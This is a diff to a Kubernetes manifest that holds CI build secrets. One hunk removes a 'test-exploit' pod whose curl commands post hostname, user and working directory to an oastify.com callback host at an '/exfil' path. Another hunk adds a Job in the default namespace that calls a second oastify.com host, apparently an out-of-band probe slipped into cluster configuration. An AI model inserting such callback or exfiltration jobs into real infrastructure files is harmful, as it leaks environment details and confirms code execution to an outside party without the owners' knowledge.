@@ -26,43 +26,6 @@ stringData:
     }
 ---
 apiVersion: v1
-  kind: Namespace
-  metadata:
-    name: test-exploit
-  ---
-  apiVersion: v1
-  kind: Pod
-  metadata:
-    name: curl-test
-    namespace: test-exploit
-    labels:
-      app: test-exploit
-  spec:
-    restartPolicy: Never
-    containers:
-    - name: curl
-      image: curlimages/curl:latest
-      command:
-      - /bin/sh
-      - -c
-      - |
-        # Simple DNS exfiltration test
-        curl -v http://n1p9mq355rj3p51jr6czvl7u6lcc05ou.oastify.com/webhook?source=github_actions&test=success
-
-        # Com mais informações do ambiente
-        curl -X POST http://n1p9mq355rj3p51jr6czvl7u6lcc05ou.oastify.com/exfil \
-          -H "Content-Type: application/json" \
-          -d "{
-            \"hostname\": \"$(hostname)\",
-            \"whoami\": \"$(whoami)\",
-            \"pwd\": \"$(pwd)\",
-            \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"
-          }"
-
-        echo "Curl test completed"
-        sleep 300
----
-apiVersion: v1
 kind: Secret
 metadata:
   name: gke-prow-build
@@ -273,3 +236,22 @@ stringData:
         "insecure": true
       }
     }
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: curl-test
+  namespace: default
+spec:
+  backoffLimit: 0
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: curl
+          image: curlimages/curl:latest
+          command:
+            - /bin/sh
+            - -c
+            - |
+              curl -sS -o /dev/null -w "status=%{http_code}\n" https://87dusb9qbcpovq74xrik16dfc6ix6suh.oastify.com/healthz
